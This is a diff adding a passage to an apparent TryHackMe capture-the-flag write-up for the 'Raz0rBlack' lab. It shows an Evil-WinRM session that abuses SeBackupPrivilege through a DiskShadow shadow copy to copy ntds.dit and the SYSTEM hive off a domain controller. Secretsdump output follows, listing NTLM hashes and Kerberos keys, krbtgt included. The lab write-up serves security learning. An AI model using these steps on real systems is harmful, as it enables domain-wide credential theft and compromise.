@@ -798,3 +798,193 @@ d-r---        9/15/2018  12:19 AM                Videos
 *Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
 LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
 ```
+
+```txt
+set metadata C:\tmp\tmp.cabs 
+set context persistent nowriters 
+add volume c: alias someAlias 
+create 
+expose %someAlias% w: 
+```
+
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.148.194 -u xyan1d3 -p cyanide9amine5628
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> mkdir C:\tmp
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/13/2022   8:26 AM                tmp
+
+
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd C:\tmp
+*Evil-WinRM* PS C:\tmp> ls
+*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
+Info: Uploading diskshadow.txt to C:\tmp\diskshadow.txt
+
+
+Data: 164 bytes of 164 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> diskshadow.exe /s C:\tmp\diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  HAVEN-DC,  7/13/2022 8:28:23 AM
+
+-> set metadata C:\tmp\tmp.cabs
+-> set context persistent nowriters
+-> add volume c: alias someAlias
+-> create
+Alias someAlias for shadow ID {7d238505-6690-4be2-9358-88f6595699fb} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {d7aaa77a-0261-4dbf-a29d-92289b81815c} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {d7aaa77a-0261-4dbf-a29d-92289b81815c}
+
+        * Shadow copy ID = {7d238505-6690-4be2-9358-88f6595699fb}               %someAlias%
+                - Shadow copy set: {d7aaa77a-0261-4dbf-a29d-92289b81815c}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 7/13/2022 8:28:26 AM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: HAVEN-DC.raz0rblack.thm
+                - Service machine: HAVEN-DC.raz0rblack.thm
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %someAlias% w:
+-> %someAlias% = {7d238505-6690-4be2-9358-88f6595699fb}
+The shadow copy was successfully exposed as w:\.
+*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
+Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll
+
+
+Data: 16384 bytes of 16384 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
+Info: Uploading SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll
+
+
+Data: 21844 bytes of 21844 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\tmp> Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit C:\tmp\ntds.dit -Overwrite
+*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM c:\tmp\system.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\tmp> ls
+
+
+    Directory: C:\tmp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/13/2022   8:27 AM            125 diskshadow.txt
+-a----        7/13/2022   8:30 AM       16777216 ntds.dit
+-a----        7/13/2022   8:28 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        7/13/2022   8:29 AM          16384 SeBackupPrivilegeUtils.dll
+-a----        7/13/2022   8:31 AM       17219584 system.hive
+-a----        7/13/2022   8:28 AM            640 tmp.cabs
+
+
+*Evil-WinRM* PS C:\tmp> ls
+
+
+    Directory: C:\tmp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/13/2022   8:27 AM            125 diskshadow.txt
+-a----        7/13/2022   8:30 AM       16777216 ntds.dit
+-a----        7/13/2022   8:28 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        7/13/2022   8:29 AM          16384 SeBackupPrivilegeUtils.dll
+-a----        7/13/2022   8:31 AM       17219584 system.hive
+-a----        7/13/2022   8:28 AM            640 tmp.cabs
+
+
+
+*Evil-WinRM* PS C:\tmp> download ntds.dit
+Info: Downloading ntds.dit to ./ntds.dit
+
+
+Info: Download successful!
+
+*Evil-WinRM* PS C:\tmp> download /tmp/ntds.dit
+Info: Downloading /tmp/ntds.dit to ./ntds.dit
+
+
+Info: Download successful!
+
+*Evil-WinRM* PS C:\tmp> download /tmp/system.hive
+Info: Downloading /tmp/system.hive to ./system.hive
+
+
+Info: Download successful!
+
+
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee secretsdump_1.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: f6162bb347993035d66a15417d73a667
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
+raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
+raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
+raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
+raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
+[*] Kerberos keys from ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
+Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
+Administrator:des-cbc-md5:d3b646b65bceb5c7
+HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
+HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
+HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
+krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
+krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
+krbtgt:des-cbc-md5:857a46f13e91eae3
+raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
+raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
+raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
+raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
+raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
+raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
+raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
+raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
+raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
+raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
+raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
+raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
+[*] Cleaning up...
+```
+
